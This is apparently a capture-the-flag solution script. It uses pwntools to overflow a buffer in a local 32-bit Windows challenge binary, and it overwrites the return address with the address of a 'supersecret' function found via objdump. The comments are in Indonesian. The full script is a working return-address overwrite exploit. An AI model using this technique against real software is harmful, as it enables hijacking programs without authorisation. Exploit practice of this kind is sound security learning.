from pwn import *

# Start the process
p = process('./output/bikinctf.exe')

# Alamat supersecret yang benar dari objdump
supersecret_addr = 0x401460  # Alamat yang kita dapat dari objdump

# Craft payload
payload = b"A" * 44  # Buffer + frame pointer
payload += p32(supersecret_addr)  # Karena ini 32-bit Windows, gunakan p32

# Kirim payload
p.sendline(payload)
p.interactive()